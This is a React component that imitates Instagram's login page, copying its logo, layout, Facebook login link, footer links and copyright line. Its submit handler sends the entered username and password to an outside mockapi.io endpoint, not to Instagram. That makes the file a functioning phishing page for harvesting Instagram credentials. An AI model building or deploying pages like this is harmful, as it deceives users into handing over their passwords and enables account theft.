import './App.css';
import React, { useState } from "react";
import axios from "axios";

function App() {
  const [AddUserdata, setAddUserdata] = useState({
    username: '',
    password: ''
    }
      
    );     

  const handleChange =  (e) => {

      setAddUserdata({

      ...AddUserdata,[e.target.name]:e.target.value
    
  })
  }

  const handleSubmit = async (e) => {
    e.preventDefault();

    const{ username ,password} =AddUserdata
    if(username && password ){
   await axios.post(
  "https://6ac88a8dfd7c536b1bd94092.mockapi.io/UserApi/Userlogin",
  AddUserdata
);
    } else{
        alert("invalid")
    }
  };

  return (
    <div>
      {/* <h2>User Login</h2>

      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Enter Username"
          value={AddUserdata.username}
          onChange={handleChange}
          name="username"
          required
        />

        <br /><br />

        <input
          type="password"
          placeholder="Enter Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          required
        />

        <br /><br />

        <button type="submit">Login</button>
      </form> */}




        <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex">
        </section>
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
                    <img src="/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label htmlFor="email" className="sr-only">Phone number, username, or email</label>
                    <input name="username" value={AddUserdata.username} onChange={handleChange} placeholder="Phone number, username, or email" />

                    <label htmlFor="password" className="sr-only">Password</label>
                    <input name="password" type="password" value={AddUserdata.password} onChange={handleChange} placeholder="Password" />

                    <button type="button" onClick={handleSubmit}>Log in</button>
                </form>
                <div className="flex separator align-items-center">
                    <span></span>
                    <div className="or">OR</div>
                    <span></span>
                </div>
                <div className="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img alt="" />
                        <a href="https://www.facebook.com/login/">Log in with Facebook</a>
                    </div>
                    <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </div>
            <div className="panel register flex justify-content-center">
                <p>Don’t have an account?</p>
                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
            </div>
            <div className="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div className="flex justify-content-center">
                    <img src="/apple-button.png"      alt="Apple App Store logo" title="Apple App Store logo" />
                    <img src="/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul className="flex flex-wrap justify-content-center">
            <li><a href="https://about.instagram.com/">ABOUT</a></li>
            <li><a href="https://help.instagram.com/">HELP</a></li>
            <li><a href="https://about.instagram.com/blog/">PRESS</a></li>
            <li><a href="https://developers.facebook.com/docs/instagram-platform/">API</a></li>
            <li><a href="https://www.metacareers.com/">JOBS</a></li>
            <li><a href="https://privacycenter.instagram.com/policy/">PRIVACY</a></li>
            <li><a href="https://help.instagram.com/581066165581870/">TERMS</a></li>
            <li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
            <li><a href="https://www.instagram.com/explore/">TOP ACCOUNTS</a></li>
            <li><a href="https://www.instagram.com/explore/tags/">HASHTAGS</a></li>
            <li><a href="https://help.instagram.com/111923612310997/">LANGUAGE</a></li>
        </ul>
        <p className="copyright">© 2020 Instagram from Facebook</p>
    </footer>
    </div>
  );
}

export default App;
